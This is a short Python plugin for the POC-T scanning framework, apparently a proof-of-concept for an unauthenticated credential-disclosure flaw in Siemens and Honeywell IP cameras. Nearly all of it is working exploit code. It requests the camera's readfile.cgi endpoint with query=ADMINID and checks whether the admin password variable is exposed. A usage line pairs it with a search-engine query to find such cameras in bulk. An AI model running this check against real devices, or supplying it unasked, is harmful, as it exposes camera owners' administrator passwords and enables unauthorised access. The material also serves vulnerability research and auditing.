#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
SIEMENS IP-Camera Unauthenticated Remote Credentials Disclosure

Usage
  python POC-T.py -s siemens-camera-getpwd -aZ "SIEMENS IP-Camera"

version
  SIEMENS IP-Camera CCMW1025 x.2.2.1798, CxMS2025_V2458_SP1, x.2.2.1798, x.2.2.1235
  Honeywell IP-Camera HICC-1100PT

"""

import requests
from plugin.urlparser import get_domain


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    payload = "/cgi-bin/readfile.cgi?query=ADMINID"
    target_url = get_domain(url) + payload
    try:
        r = requests.get(target_url, timeout=10)
        if 'var Adm_Pass1' in r.content:
            return target_url
    except Exception:
        pass
    return False
